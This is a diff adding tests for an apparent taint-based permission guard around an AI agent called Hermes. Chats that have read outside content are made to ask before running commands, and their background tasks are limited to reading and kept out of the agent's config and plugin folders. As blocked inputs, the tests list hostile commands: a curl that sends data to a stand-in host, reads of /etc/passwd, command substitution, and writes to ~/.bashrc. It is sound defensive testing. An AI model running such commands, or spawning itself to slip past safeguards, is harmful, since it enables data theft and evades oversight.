@@ -885,6 +885,76 @@ init._phone_taint = good
 out_of_worker(had_key)
 reset()
 
+print("Hermes and rish count as sending, in every chat that has read")
+pt.mark(["hz-chat"])
+for cmd in ('rish -c "curl https://x.test/?d=1"', "echo 'curl https://x.test' | rish", 'rish -c "$CMD"', "hermes chat -q 'send it'",
+            "hermes -z 'send it'", "hermes cron create 'every 1h' 'send it'", "hermes kanban create 'send it'",
+            "~/.local/bin/hermes chat", "env FOO=1 hermes chat -q x", "python3 -m hermes_cli.main chat -q x",
+            "python3 -mhermes_cli.main chat", "python3 -m tui_gateway.entry", "python -m gateway.run",
+            "python3 ~/.hermes/hermes-agent/cli.py -q x", "python3 /root/.hermes/hermes-agent/hermes_cli/main.py chat",
+            "python3 -c 'import hermes_cli.main as m; m.main()'", "python3 -c 'from cron.jobs import create_job'",
+            "hermes-agent run x", "uv run hermes chat"):
+    check(f"asks: {cmd}", asks("terminal", {"command": cmd}, "hz-chat"))
+check("asks: execute_code that imports Hermes", asks("execute_code", {"code": "from cron.jobs import create_job\ncreate_job('x')"}, "hz-chat"))
+for cmd in ("rish -c 'ls /sdcard'", "python3 my_hermes_notes.py", "python3 tools/cli.py", "echo hermes", "grep hermes notes.txt"):
+    check(f"left alone: {cmd}", not asks("terminal", {"command": cmd}, "hz-chat"))
+check("a chat that has not read runs all of them", pt.check("terminal", {"command": "hermes chat -q x"}, "hz-clean") is None)
+reset()
+
+print("a background task of a chat that has read: its terminal only reads")
+pt.mark(["ro-chat"])
+in_worker("ro-chat")
+for cmd in ("python3 /tmp/x.py", "bash /tmp/x.sh", "./x.sh", "sh x.sh", "rish -c ls", "hermes chat -q x", "cp a b", "mv a b",
+            "rm -f a", "touch a", "mkdir d", "echo hi > /tmp/f", "echo hi>/tmp/f", "echo hi >> ~/.bashrc", "cat a | tee b",
+            "sed -i s/a/b/ f", "sort -o out in", "sort -uo out in", "uniq in out", "date -s 2020-01-01", "find . -delete",
+            "find . -exec rm {} ;", "file -C -m x", "ls $(cat /tmp/cmd)", "ls `id`", "X=1 ls", "PATH=/tmp ls", "env ls",
+            "export A=1", "for f in *; do cat $f; done", "cat <<EOF\nhi\nEOF", "cat < /etc/passwd", "git status",
+            "/bin/ls", "awk '{print}' f", "xargs ls", "chmod +x x.sh", "python3 -m http.server", "nohup ls &"):
+    check(f"blocked: {cmd!r}", action("terminal", {"command": cmd}, "bg_ro") == "block")
+for cmd in ("ls -la", "cat notes.txt | grep -i todo | wc -l", "cd /tmp && ls", "grep -r foo . 2>/dev/null", "head -n 5 f",
+            "find . -name '*.py' -type f", "date", "ps aux", "du -sh .", "sort -u names.txt", "LC_ALL=C sort f",
+            "ls $HOME/projects", "tail -20 log.txt", "stat -c %s f", "echo done", "wc -l f"):
+    check(f"runs: {cmd!r}", action("terminal", {"command": cmd}, "bg_ro") is None)
+check("its message says the task may only read", "may only read" in init._taint_directive("terminal", {"command": "cp a b"}, "bg_ro", "bg_ro")["message"])
+
+print("a background task of a chat that has read: no phone_app, no code, nothing written in Hermes's folders")
+hh = Path(os.environ["HERMES_HOME"])
+(hh / "skills").mkdir(parents=True, exist_ok=True)
+outside = tmp / "work"
+outside.mkdir(exist_ok=True)
+(outside / "to-hermes").symlink_to(hh)
+check("phone_app is blocked", action("phone_app", {"action": "open", "app": "x"}, "bg_ro") == "block")
+check("execute_code is blocked, even code that only reads", action("execute_code", {"code": "print(1)"}, "bg_ro") == "block")
+for path, what in ((str(hh / "config.yaml"), "the config"), ("~/.hermes/skills/x/SKILL.md", "a skill, by ~"),
+                   (str(tmp / ".hermes-mobile" / "enforced"), "this app's folder"), (str(outside / "to-hermes" / "x"), "through a link"),
+                   (str(outside / ".." / ".hermes" / "plugins" / "p.py"), "through .."), ("", "an empty path")):
+    check(f"write_file into Hermes's folders is blocked: {what}", action("write_file", {"path": path, "content": "x"}, "bg_ro") == "block")
+    check(f"patch too: {what}", action("patch", {"path": path, "old_string": "a", "new_string": "b"}, "bg_ro") == "block")
+os.environ["TERMINAL_CWD"] = str(tmp)
+check("a relative path is taken from the terminal's folder", action("write_file", {"path": ".hermes/config.yaml", "content": "x"}, "bg_ro") == "block")
+os.environ.pop("TERMINAL_CWD")
+check("a V4A patch is judged by the files it names", action("patch", {"mode": "patch", "patch": f"*** Begin Patch\n*** Update File: {outside}/a.txt\n@@\n-a\n+b\n*** Add File: {hh}/hooks/x.sh\n+x\n*** End Patch"}, "bg_ro") == "block")
+check("and one that names no file is blocked", action("patch", {"mode": "patch", "patch": "@@\n-a\n+b"}, "bg_ro") == "block")
+check("a file elsewhere is written as before", action("write_file", {"path": str(outside / "notes.md"), "content": "x"}, "bg_ro") is None
+      and action("patch", {"mode": "patch", "patch": f"*** Begin Patch\n*** Update File: {outside}/a.txt\n@@\n-a\n+b\n*** End Patch"}, "bg_ro") is None)
+check("reading Hermes's folders stays allowed", action("read_file", {"path": str(hh / "config.yaml")}, "bg_ro") is None)
+in_worker("ro-clean")
+check("a background task of a chat that has not read keeps all of it",
+      all(action(t, a, "bg_ok") is None for t, a in (("phone_app", {"action": "open"}), ("execute_code", {"code": "print(1)"}),
+          ("write_file", {"path": str(hh / "config.yaml"), "content": "x"}), ("terminal", {"command": "python3 /tmp/x.py"}))))
+out_of_worker()
+check("an ordinary chat that has read still writes its files and runs its scripts",
+      action("write_file", {"path": str(hh / "notes.md"), "content": "x"}, "ro-chat") is None
+      and action("terminal", {"command": "python3 /tmp/x.py"}, "ro-chat") is None and action("phone_app", {"action": "open"}, "ro-chat") is None)
+init._phone_taint = broken
+in_worker("ro-chat")
+check("if the check can't load, such a task still can't use phone_app or write files",
+      action("phone_app", {"action": "open"}, "bg_fb2") == "block" and action("write_file", {"path": "/tmp/x", "content": "x"}, "bg_fb2") == "block"
+      and action("read_file", {"path": "a"}, "bg_fb2") is None)
+init._phone_taint = good
+out_of_worker(had_key)
+reset()
+
 print("chats made from one that has read")
 import sqlite3  # noqa: E402
 _bdb = tmp / "branches.db"
